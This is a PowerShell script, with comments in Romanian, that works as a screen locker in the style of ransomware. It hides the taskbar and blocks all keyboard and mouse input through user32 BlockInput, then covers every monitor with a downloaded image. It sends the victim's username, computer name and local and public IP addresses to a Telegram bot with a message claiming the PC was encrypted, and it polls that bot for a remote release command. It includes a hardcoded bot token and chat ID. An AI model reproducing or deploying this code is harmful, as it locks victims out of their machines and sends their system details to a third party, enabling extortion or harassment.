Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod pentru input și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# ▶️ Config și sistem
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$chatID = '656189986'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'

# IP local
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

# IP public
try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { $ipPublic = "n/a" }

# ▶️ Trimite mesaj la pornire
$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
$uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
try { Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json' } catch {}

# ▶️ Ascunde taskbar și blochează input
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)
[Native]::BlockInput($true)

# ▶️ Descarcă imaginea
$temp = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing

# ▶️ Calculează full screen pe toate monitoarele
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$maxX = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$maxY = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$width = $maxX - $minX
$height = $maxY - $minY

# ▶️ Variabilă globală
$script:inchis = $false

# ▶️ Funcție închidere completă
function InchideTot {
    $script:inchis = $true
    [Native]::BlockInput($false)
    [Native]::ShowWindow($taskbar, 1)
    $form.Invoke([Action]{ $form.Close() })
}

# ▶️ Form mare
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = New-Object Drawing.Point $minX, $minY
$form.Size = New-Object Drawing.Size $width, $height
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

$img = [System.Drawing.Image]::FromFile($temp)
$pb = New-Object Windows.Forms.PictureBox
$pb.Image = $img
$pb.Dock = 'Fill'
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)

# ▶️ Închidere la tasta C
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') {
        InchideTot
    }
})

$form.Add_FormClosing({
    if (-not $script:inchis) { $_.Cancel = $true }
})

# ▶️ Verifică Telegram la fiecare 5 sec
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 5000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
        foreach ($u in $updates.result) {
            $text = $u.message.text
            if ($text -eq "👍 $user" -or $text -eq "👍 $pc") {
                $timer.Stop()
                InchideTot
            }
        }
    } catch {}
})
$timer.Start()

# ▶️ Arată fereastra și rulează
$form.Show()
[System.Windows.Forms.Application]::Run($form)
